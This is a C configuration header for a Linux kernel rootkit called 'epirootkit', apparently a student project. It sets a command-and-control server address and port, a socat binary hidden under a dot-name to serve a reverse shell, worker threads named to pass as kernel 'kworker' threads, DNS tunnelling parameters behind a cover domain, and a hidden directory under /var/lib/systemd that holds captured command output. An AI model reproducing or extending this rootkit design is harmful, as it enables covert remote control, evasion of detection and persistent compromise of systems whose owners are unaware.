#ifndef CONFIG_H
#define CONFIG_H

// RETURN MACROS
#define SUCCESS 0
#define FAILURE 1

// LOG MACROS
#define DEBUG 1
#define DBG_MSG(fmt, args...) 								\
	do { 													\
		if (DEBUG) { 										\
			pr_info(fmt, ##args); 							\
		} 													\
	} while (0)

#define ERR_MSG(fmt, args...) 								\
	do { 													\
		if (DEBUG) { 										\
			pr_err(fmt, ##args); 							\
		} 													\
	} while (0)

// PARAMETERS MACROS
#define SERVER_IP "192.168.100.1"
#define SERVER_PORT 4242
#define CONNEXION_MESSAGE "epirootkit: connexion established\n"

// SOCAT MACROS
#define SOCAT_BINARY_PATH HIDDEN_DIR_PATH "/.sysd"
#define REVERSE_SHELL_PORT 9001

// TCP MACROS
#define NETWORK_WORKER_THREAD_NAME "kworker/u42"
#define MAX_MSG_SEND_OR_RECEIVE_ERROR 5
#define TIMEOUT_BEFORE_RETRY 1000
#define RCV_CMD_BUFFER_SIZE 1024

// DNS MACROS
#define DNS_WORKER_THREAD_NAME "kworker/u84"
#define DNS_POLL_INTERVAL_MS 5000
#define DNS_PORT 53
#define DNS_MAX_BUF 4096
#define DNS_HDR_SIZE 12
#define DNS_MAX_CHUNK 28
#define DNS_SERVER_IP SERVER_IP
#define DNS_DOMAIN "dns.google.com"

// HIDDEN FILES MACROS
#define HIDDEN_DIR_NAME ".epirootkit-hidden-fs"
#define HIDDEN_DIR_PATH "/var/lib/systemd/" HIDDEN_DIR_NAME
#define STDOUT_FILE HIDDEN_DIR_PATH "/std.out"
#define STDERR_FILE HIDDEN_DIR_PATH "/std.err"

// OTHER MACROS
#define STD_BUFFER_SIZE 1024

// MODULE PARAMETERS
extern char *ip;
extern int port;
extern char *message;

#endif /* CONFIG_H */